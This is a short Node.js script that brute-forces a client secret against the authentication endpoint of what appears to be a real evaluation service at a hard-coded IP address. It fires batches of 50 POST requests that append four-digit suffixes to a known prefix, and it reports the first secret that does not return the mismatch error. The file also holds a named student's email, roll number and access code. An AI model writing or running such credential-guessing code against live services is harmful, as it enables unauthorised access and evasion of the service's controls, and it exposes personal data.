
const http = require("http");
const https = require("http"); // it is http://4.224.186.213

const payload = {
    clientID: "1b0b7cdd-2627-439b-a8bc-34e3313b77e8",
    name: "Vishal Vashistha",
    email: "vishal.vashistha2023@glbajajgroup.org",
    rollNo: "2305111520064",
    accessCode: "xxkJnk"
};

async function check(secret) {
    return new Promise((resolve) => {
        const data = JSON.stringify({ ...payload, clientSecret: secret });
        const req = https.request({
            hostname: "4.224.186.213",
            port: 80,
            path: "/evaluation-service/auth",
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": data.length
            }
        }, (res) => {
            let body = "";
            res.on("data", d => body += d);
            res.on("end", () => {
                if (res.statusCode === 200 || !body.includes("provided fields does not match")) {
                    resolve({ secret, body, statusCode: res.statusCode });
                } else {
                    resolve(null);
                }
            });
        });
        req.on("error", () => resolve(null));
        req.write(data);
        req.end();
    });
}

async function run() {
    console.log("Starting brute force...");
    for (let i = 0; i <= 9999; i += 50) {
        const promises = [];
        for (let j = 0; j < 50; j++) {
            if (i + j > 9999) break;
            const suffix = String(i + j).padStart(4, "0");
            promises.push(check("eHmzQGWpmBRC" + suffix));
        }
        const results = await Promise.all(promises);
        const found = results.find(r => r !== null);
        if (found) {
            console.log("FOUND SECRET:", found);
            return;
        }
        if (i % 500 === 0) console.log("Progress:", i);
    }
    console.log("Not found in 0000-9999");
}
run();

